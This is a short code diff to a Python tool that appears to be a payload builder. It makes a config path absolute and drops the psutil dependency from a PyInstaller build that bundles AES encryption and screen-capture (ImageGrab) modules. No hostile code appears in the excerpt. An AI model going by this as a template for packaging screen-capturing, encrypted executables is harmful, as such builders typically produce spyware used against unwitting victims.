@@ -11,7 +11,7 @@ import tempfile
 if os.name == 'nt':
     os.system('')
 
-CONFIG_FILE = 'shiver_config.json'
+CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'shiver_config.json')
 
 COLORS = {
     'reset': '\033[0m',
@@ -62,10 +62,6 @@ def check_dependencies():
         from Crypto.Cipher import AES
     except:
         missing.append('pycryptodome')
-    try:
-        import psutil
-    except:
-        missing.append('psutil')
     try:
         from PIL import ImageGrab
     except:
@@ -391,7 +387,6 @@ class Builder:
                 '--hidden-import', 'Crypto',
                 '--hidden-import', 'Crypto.Cipher',
                 '--hidden-import', 'Crypto.Cipher.AES',
-                '--hidden-import', 'psutil',
                 '--hidden-import', 'PIL',
                 '--hidden-import', 'PIL.ImageGrab',
                 '--hidden-import', 'core.utils',
